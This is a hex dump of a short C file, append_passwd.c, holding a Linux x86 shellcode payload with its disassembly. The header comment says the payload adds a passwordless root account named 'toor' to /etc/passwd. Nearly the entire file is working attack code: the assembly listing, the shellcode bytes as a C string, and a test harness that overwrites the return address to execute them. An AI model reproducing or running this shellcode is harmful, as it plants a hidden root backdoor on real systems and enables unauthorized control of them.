00000000  2f 2a 0d 0a 20 20 20 20  61 70 70 65 6e 64 5f 70  |/*..    append_p|
00000010  61 73 73 77 64 2e 63 0d  0a 20 20 20 20 50 61 79  |asswd.c..    Pay|
00000020  6c 6f 61 64 3a 20 41 64  64 73 20 74 68 65 20 73  |load: Adds the s|
00000030  74 72 69 6e 67 3a 20 5b  74 6f 6f 72 3a 3a 30 3a  |tring: [toor::0:|
00000040  30 3a 74 30 30 72 3a 2f  72 6f 6f 74 3a 2f 62 69  |0:t00r:/root:/bi|
00000050  6e 2f 62 61 73 68 5d 20  74 6f 20 2f 65 74 63 2f  |n/bash] to /etc/|
00000060  70 61 73 73 77 64 20 74  68 65 72 65 62 79 20 61  |passwd thereby a|
00000070  64 64 69 6e 67 20 61 20  70 61 73 73 77 6f 72 64  |dding a password|
00000080  2d 6c 65 73 73 20 72 6f  6f 74 20 61 63 63 6f 75  |-less root accou|
00000090  6e 74 20 77 69 74 68 20  6c 6f 67 69 6e 20 6e 61  |nt with login na|
000000a0  6d 65 20 22 74 6f 6f 72  22 2e 0d 0a 20 20 20 20  |me "toor"...    |
000000b0  50 6c 61 74 66 6f 72 6d  3a 20 6c 69 6e 75 78 2f  |Platform: linux/|
000000c0  78 38 36 0d 0a 20 20 20  20 53 69 7a 65 3a 20 31  |x86..    Size: 1|
000000d0  30 37 20 62 79 74 65 73  0d 0a 20 20 20 20 41 75  |07 bytes..    Au|
000000e0  74 68 6f 72 3a 20 24 61  6e 64 6d 61 6e 2c 20 6e  |thor: $andman, n|
000000f0  34 6d 64 6e 34 73 5b 34  54 5d 67 6d 61 69 6c 2e  |4mdn4s[4T]gmail.|
00000100  63 6f 6d 0d 0a 2a 2f 0d  0a 0d 0a 2f 2a 0d 0a 30  |com..*/..../*..0|
00000110  38 30 34 39 30 35 34 20  3c 5f 73 74 61 72 74 3e  |8049054 <_start>|
00000120  3a 0d 0a 20 38 30 34 39  30 35 34 3a 20 20 20 20  |:.. 8049054:    |
00000130  65 62 20 33 38 20 20 20  20 20 20 20 20 20 20 20  |eb 38           |
00000140  20 20 20 20 20 20 20 20  6a 6d 70 20 20 20 20 38  |        jmp    8|
00000150  30 34 39 30 38 65 20 3c  63 61 6c 6c 66 75 6e 63  |04908e <callfunc|
00000160  3e 0d 0a 0d 0a 30 38 30  34 39 30 35 36 20 3c 66  |>....08049056 <f|
00000170  75 6e 63 3e 3a 0d 0a 20  38 30 34 39 30 35 36 3a  |unc>:.. 8049056:|
00000180  20 20 20 20 35 65 20 20  20 20 20 20 20 20 20 20  |    5e          |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 70 6f 70 20  |            pop |
000001a0  20 20 20 25 65 73 69 0d  0a 20 38 30 34 39 30 35  |   %esi.. 804905|
000001b0  37 3a 20 20 20 20 33 31  20 63 30 20 20 20 20 20  |7:    31 c0     |
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
000001d0  72 20 20 20 20 25 65 61  78 2c 25 65 61 78 0d 0a  |r    %eax,%eax..|
000001e0  20 38 30 34 39 30 35 39  3a 20 20 20 20 38 38 20  | 8049059:    88 |
000001f0  34 36 20 30 62 20 20 20  20 20 20 20 20 20 20 20  |46 0b           |
00000200  20 20 20 20 20 6d 6f 76  20 20 20 20 25 61 6c 2c  |     mov    %al,|
00000210  30 78 62 28 25 65 73 69  29 0d 0a 20 38 30 34 39  |0xb(%esi).. 8049|
00000220  30 35 63 3a 20 20 20 20  38 38 20 34 36 20 32 62  |05c:    88 46 2b|
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000240  6d 6f 76 20 20 20 20 25  61 6c 2c 30 78 32 62 28  |mov    %al,0x2b(|
00000250  25 65 73 69 29 0d 0a 20  38 30 34 39 30 35 66 3a  |%esi).. 804905f:|
00000260  20 20 20 20 63 36 20 34  36 20 32 61 20 30 61 20  |    c6 46 2a 0a |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 62  |            movb|
00000280  20 20 20 24 30 78 61 2c  30 78 32 61 28 25 65 73  |   $0xa,0x2a(%es|
00000290  69 29 0d 0a 20 38 30 34  39 30 36 33 3a 20 20 20  |i).. 8049063:   |
000002a0  20 38 64 20 35 65 20 30  63 20 20 20 20 20 20 20  | 8d 5e 0c       |
000002b0  20 20 20 20 20 20 20 20  20 6c 65 61 20 20 20 20  |         lea    |
000002c0  30 78 63 28 25 65 73 69  29 2c 25 65 62 78 0d 0a  |0xc(%esi),%ebx..|
000002d0  20 38 30 34 39 30 36 36  3a 20 20 20 20 38 39 20  | 8049066:    89 |
000002e0  35 65 20 32 63 20 20 20  20 20 20 20 20 20 20 20  |5e 2c           |
000002f0  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 62 78  |     mov    %ebx|
00000300  2c 30 78 32 63 28 25 65  73 69 29 0d 0a 20 38 30  |,0x2c(%esi).. 80|
00000310  34 39 30 36 39 3a 20 20  20 20 38 64 20 31 65 20  |49069:    8d 1e |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  20 20 6c 65 61 20 20 20  20 28 25 65 73 69 29 2c  |  lea    (%esi),|
00000340  25 65 62 78 0d 0a 20 38  30 34 39 30 36 62 3a 20  |%ebx.. 804906b: |
00000350  20 20 20 36 36 20 62 39  20 34 32 20 30 34 20 20  |   66 b9 42 04  |
00000360  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000370  20 20 24 30 78 34 34 32  2c 25 63 78 0d 0a 20 38  |  $0x442,%cx.. 8|
00000380  30 34 39 30 36 66 3a 20  20 20 20 36 36 20 62 61  |04906f:    66 ba|
00000390  20 61 34 20 30 31 20 20  20 20 20 20 20 20 20 20  | a4 01          |
000003a0  20 20 20 6d 6f 76 20 20  20 20 24 30 78 31 61 34  |   mov    $0x1a4|
000003b0  2c 25 64 78 0d 0a 20 38  30 34 39 30 37 33 3a 20  |,%dx.. 8049073: |
000003c0  20 20 20 62 30 20 30 35  20 20 20 20 20 20 20 20  |   b0 05        |
000003d0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
000003e0  20 20 24 30 78 35 2c 25  61 6c 0d 0a 20 38 30 34  |  $0x5,%al.. 804|
000003f0  39 30 37 35 3a 20 20 20  20 63 64 20 38 30 20 20  |9075:    cd 80  |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  | int    $0x80.. |
00000420  38 30 34 39 30 37 37 3a  20 20 20 20 38 39 20 63  |8049077:    89 c|
00000430  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
00000440  20 20 20 20 6d 6f 76 20  20 20 20 25 65 61 78 2c  |    mov    %eax,|
00000450  25 65 62 78 0d 0a 20 38  30 34 39 30 37 39 3a 20  |%ebx.. 8049079: |
00000460  20 20 20 33 31 20 64 32  20 20 20 20 20 20 20 20  |   31 d2        |
00000470  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 20 20  |           xor  |
00000480  20 20 25 65 64 78 2c 25  65 64 78 0d 0a 20 38 30  |  %edx,%edx.. 80|
00000490  34 39 30 37 62 3a 20 20  20 20 38 62 20 34 65 20  |4907b:    8b 4e |
000004a0  32 63 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2c              |
000004b0  20 20 6d 6f 76 20 20 20  20 30 78 32 63 28 25 65  |  mov    0x2c(%e|
000004c0  73 69 29 2c 25 65 63 78  0d 0a 20 38 30 34 39 30  |si),%ecx.. 80490|
000004d0  37 65 3a 20 20 20 20 62  32 20 31 66 20 20 20 20  |7e:    b2 1f    |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
000004f0  6f 76 20 20 20 20 24 30  78 31 66 2c 25 64 6c 0d  |ov    $0x1f,%dl.|
00000500  0a 20 38 30 34 39 30 38  30 3a 20 20 20 20 62 30  |. 8049080:    b0|
00000510  20 30 34 20 20 20 20 20  20 20 20 20 20 20 20 20  | 04             |
00000520  20 20 20 20 20 20 6d 6f  76 20 20 20 20 24 30 78  |      mov    $0x|
00000530  34 2c 25 61 6c 0d 0a 20  38 30 34 39 30 38 32 3a  |4,%al.. 8049082:|
00000540  20 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |    cd 80       |
00000550  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
00000560  20 20 20 24 30 78 38 30  0d 0a 20 38 30 34 39 30  |   $0x80.. 80490|
00000570  38 34 3a 20 20 20 20 62  30 20 30 36 20 20 20 20  |84:    b0 06    |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000590  6f 76 20 20 20 20 24 30  78 36 2c 25 61 6c 0d 0a  |ov    $0x6,%al..|
000005a0  20 38 30 34 39 30 38 36  3a 20 20 20 20 63 64 20  | 8049086:    cd |
000005b0  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
000005c0  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
000005d0  30 0d 0a 20 38 30 34 39  30 38 38 3a 20 20 20 20  |0.. 8049088:    |
000005e0  62 30 20 30 31 20 20 20  20 20 20 20 20 20 20 20  |b0 01           |
000005f0  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000600  30 78 31 2c 25 61 6c 0d  0a 20 38 30 34 39 30 38  |0x1,%al.. 804908|
00000610  61 3a 20 20 20 20 33 31  20 64 62 20 20 20 20 20  |a:    31 db     |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00000630  72 20 20 20 20 25 65 62  78 2c 25 65 62 78 0d 0a  |r    %ebx,%ebx..|
00000640  20 38 30 34 39 30 38 63  3a 20 20 20 20 63 64 20  | 804908c:    cd |
00000650  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
00000660  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
00000670  30 0d 0a 20 0d 0a 20 30  38 30 34 39 30 38 65 20  |0.. .. 0804908e |
00000680  3c 63 61 6c 6c 66 75 6e  63 3e 3a 0d 0a 20 38 30  |<callfunc>:.. 80|
00000690  34 39 30 38 65 3a 20 20  20 20 65 38 20 63 33 20  |4908e:    e8 c3 |
000006a0  66 66 20 66 66 20 66 66  20 20 20 20 20 20 20 20  |ff ff ff        |
000006b0  20 20 63 61 6c 6c 20 20  20 38 30 34 39 30 35 36  |  call   8049056|
000006c0  20 3c 66 75 6e 63 3e 0d  0a 20 38 30 34 39 30 39  | <func>.. 804909|
000006d0  33 3a 20 20 20 20 2e 2e  2e 2e 2e 2e 73 74 72 69  |3:    ......stri|
000006e0  6e 67 2e 2e 2e 2e 2e 2e  2e 0d 0a 2a 2f 0d 0a 0d  |ng.........*/...|
000006f0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000700  2e 68 3e 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.h>..#include <s|
00000710  74 72 69 6e 67 2e 68 3e  0d 0a 0d 0a 63 68 61 72  |tring.h>....char|
00000720  20 73 68 65 6c 6c 5b 5d  3d 20 20 20 22 5c 78 65  | shell[]=   "\xe|
00000730  62 5c 78 33 38 5c 78 35  65 5c 78 33 31 5c 78 63  |b\x38\x5e\x31\xc|
00000740  30 5c 78 38 38 5c 78 34  36 5c 78 30 62 5c 78 38  |0\x88\x46\x0b\x8|
00000750  38 5c 78 34 36 5c 78 32  62 5c 78 63 36 5c 78 34  |8\x46\x2b\xc6\x4|
00000760  36 5c 78 32 61 5c 78 30  61 5c 78 38 64 5c 78 35  |6\x2a\x0a\x8d\x5|
00000770  65 5c 78 30 63 5c 78 38  39 5c 78 35 65 5c 78 32  |e\x0c\x89\x5e\x2|
00000780  63 5c 78 38 64 5c 78 31  65 22 0d 0a 20 20 20 20  |c\x8d\x1e"..    |
00000790  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
000007a0  36 5c 78 62 39 5c 78 34  32 5c 78 30 34 5c 78 36  |6\xb9\x42\x04\x6|
000007b0  36 5c 78 62 61 5c 78 61  34 5c 78 30 31 5c 78 62  |6\xba\xa4\x01\xb|
000007c0  30 5c 78 30 35 5c 78 63  64 5c 78 38 30 5c 78 38  |0\x05\xcd\x80\x8|
000007d0  39 5c 78 63 33 5c 78 33  31 5c 78 64 32 5c 78 38  |9\xc3\x31\xd2\x8|
000007e0  62 5c 78 34 65 5c 78 32  63 5c 78 62 32 5c 78 31  |b\x4e\x2c\xb2\x1|
000007f0  66 5c 78 62 30 5c 78 30  34 22 0d 0a 20 20 20 20  |f\xb0\x04"..    |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 63  |            "\xc|
00000810  64 5c 78 38 30 5c 78 62  30 5c 78 30 36 5c 78 63  |d\x80\xb0\x06\xc|
00000820  64 5c 78 38 30 5c 78 62  30 5c 78 30 31 5c 78 33  |d\x80\xb0\x01\x3|
00000830  31 5c 78 64 62 5c 78 63  64 5c 78 38 30 5c 78 65  |1\xdb\xcd\x80\xe|
00000840  38 5c 78 63 33 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xc3\xff\xff\xf|
00000850  66 5c 78 32 66 5c 78 36  35 5c 78 37 34 5c 78 36  |f\x2f\x65\x74\x6|
00000860  33 5c 78 32 66 5c 78 37  30 22 0d 0a 20 20 20 20  |3\x2f\x70"..    |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
00000880  31 5c 78 37 33 5c 78 37  33 5c 78 37 37 5c 78 36  |1\x73\x73\x77\x6|
00000890  34 5c 78 32 33 5c 78 37  34 5c 78 36 66 5c 78 36  |4\x23\x74\x6f\x6|
000008a0  66 5c 78 37 32 5c 78 33  61 5c 78 33 61 5c 78 33  |f\x72\x3a\x3a\x3|
000008b0  30 5c 78 33 61 5c 78 33  30 5c 78 33 61 5c 78 37  |0\x3a\x30\x3a\x7|
000008c0  34 5c 78 33 30 5c 78 33  30 5c 78 37 32 5c 78 33  |4\x30\x30\x72\x3|
000008d0  61 5c 78 32 66 5c 78 37  32 22 0d 0a 20 20 20 20  |a\x2f\x72"..    |
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
000008f0  66 5c 78 36 66 5c 78 37  34 5c 78 33 61 5c 78 32  |f\x6f\x74\x3a\x2|
00000900  66 5c 78 36 32 5c 78 36  39 5c 78 36 65 5c 78 32  |f\x62\x69\x6e\x2|
00000910  66 5c 78 36 32 5c 78 36  31 5c 78 37 33 5c 78 36  |f\x62\x61\x73\x6|
00000920  38 5c 78 32 30 5c 78 32  33 22 3b 0d 0a 0d 0a 6d  |8\x20\x23";....m|
00000930  61 69 6e 28 29 0d 0a 7b  0d 0a 20 20 20 20 70 72  |ain()..{..    pr|
00000940  69 6e 74 66 28 22 5b 2b  5d 73 68 65 6c 6c 63 6f  |intf("[+]shellco|
00000950  64 65 20 6c 65 6e 67 74  68 20 25 64 5c 6e 22 2c  |de length %d\n",|
00000960  20 73 74 72 6c 65 6e 28  73 68 65 6c 6c 29 29 3b  | strlen(shell));|
00000970  0d 0a 20 20 20 20 69 6e  74 20 2a 72 65 74 3b 0d  |..    int *ret;.|
00000980  0a 20 20 20 20 72 65 74  20 3d 20 28 69 6e 74 20  |.    ret = (int |
00000990  2a 29 26 72 65 74 20 2b  20 32 3b 0d 0a 20 20 20  |*)&ret + 2;..   |
000009a0  20 28 2a 72 65 74 29 20  3d 20 28 69 6e 74 29 73  | (*ret) = (int)s|
000009b0  68 65 6c 6c 3b 0d 0a 7d                           |hell;..}|
000009b8
